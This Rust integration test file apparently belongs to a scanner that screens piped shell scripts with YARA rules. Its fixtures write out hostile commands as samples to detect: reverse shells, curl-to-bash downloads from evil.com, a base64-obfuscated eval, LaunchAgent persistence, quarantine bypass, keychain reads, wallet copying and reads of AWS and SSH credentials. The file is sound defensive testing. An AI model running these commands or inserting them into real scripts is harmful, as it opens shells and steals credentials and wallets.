mod common;

use predicates::prelude::*;

// =============================================================================
// Integration tests with core YARA rules
// =============================================================================

#[test]
fn detects_reverse_shell_bash() {
    common::scan_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .failure()
        .stdout(predicate::str::contains("High"))
        .stdout(predicate::str::contains("reverse_shell"));
}

#[test]
fn detects_reverse_shell_nc() {
    common::scan_stdin("nc -e /bin/sh 10.0.0.1 4444")
        .failure()
        .stdout(predicate::str::contains("reverse_shell"));
}

#[test]
fn detects_staged_download() {
    common::scan_stdin("curl https://evil.com/payload.sh | bash")
        .failure()
        .stdout(predicate::str::contains("staged"));
}

#[test]
fn detects_base64_obfuscation() {
    common::scan_stdin(
        "eval $(echo 'Y3VybCBodHRwczovL2V2aWwuY29tL3NjcmlwdC5zaCB8IGJhc2g=' | base64 -d)",
    )
    .failure()
    .stdout(predicate::str::contains("Base64").or(predicate::str::contains("obfuscation")));
}

#[test]
fn detects_launchagent_persistence() {
    common::scan_stdin(
        r#"
            mkdir -p ~/Library/LaunchAgents
            cat > ~/Library/LaunchAgents/com.evil.plist << EOF
            <?xml version="1.0"?>
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.evil</string>
            </dict>
            </plist>
            EOF
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("persistence").or(predicate::str::contains("LaunchAgent")));
}

#[test]
fn detects_quarantine_bypass() {
    common::scan_stdin("xattr -d com.apple.quarantine /Applications/Evil.app")
        .failure()
        .stdout(predicate::str::contains("quarantine"));
}

#[test]
fn detects_amos_indicators() {
    common::scan_stdin("security find-generic-password -a user -s service -w")
        .failure()
        .stdout(predicate::str::contains("AMOS").or(predicate::str::contains("keychain")));
}

#[test]
fn detects_crypto_wallet_targeting() {
    common::scan_stdin(
        r#"
            cp -r ~/Library/Application\ Support/Exodus/exodus.wallet ~/tmp/
            zip -r wallets.zip ~/tmp/exodus.wallet
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("crypto").or(predicate::str::contains("wallet")));
}

#[test]
fn detects_credential_harvesting() {
    common::scan_stdin(
        r#"
            cat ~/.aws/credentials
            cat ~/.ssh/id_rsa
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("Credential").or(predicate::str::contains("harvesting")));
}

#[test]
fn allows_clean_homebrew_install() {
    common::assert_clean(
        r#"
            #!/bin/bash
            echo "Homebrew Installer"
            # This is a simplified version
            mkdir -p /usr/local/bin
            echo "Installation complete"
        "#,
    );
}

#[test]
fn allows_clean_rustup_install() {
    common::assert_clean(
        r#"
            #!/bin/sh
            # Rustup installer (simplified)
            echo "Welcome to Rust!"
            mkdir -p ~/.cargo/bin
            echo "Done."
        "#,
    );
}

// =============================================================================
// Edge cases and combinations
// =============================================================================

#[test]
fn detects_multi_stage_attack() {
    common::assert_detects(
        r#"
            curl -s https://evil.com/stage1.sh -o /tmp/s1.sh
            curl -s https://evil.com/stage2.sh -o /tmp/s2.sh
            curl -s https://evil.com/stage3.sh -o /tmp/s3.sh
            bash /tmp/s1.sh
        "#,
    );
}

#[test]
fn json_output_contains_all_fields() {
    let output = common::pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(common::core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .assert()
        .failure();

    let stdout = String::from_utf8_lossy(&output.get_output().stdout);
    assert!(stdout.contains("\"threat_level\""));
    assert!(stdout.contains("\"is_threat\""));
    assert!(stdout.contains("\"content_hash\""));
}
